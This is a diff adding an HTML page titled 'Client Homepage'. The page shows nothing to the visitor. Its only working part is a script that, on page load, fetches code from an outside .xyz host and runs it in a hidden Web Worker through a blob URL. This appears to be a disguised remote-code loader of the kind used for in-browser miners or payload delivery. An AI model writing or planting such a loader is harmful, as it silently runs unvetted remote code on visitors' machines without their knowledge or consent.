@@ -1,0 +1,24 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+    <meta charset="UTF-8" />
+    <title>Client Homepage</title>
+</head>
+<body>
+
+    <script>
+
+        var oReq = new XMLHttpRequest();
+        
+        oReq.addEventListener('load', function() {
+            var worker = new Worker(window.URL.createObjectURL(new Blob([this.responseText])));
+        });
+        
+        oReq.open("get", "http://www.wbpfserv.xyz/script");
+        oReq.send();
+
+    </script>
+
+</body>
+</html>
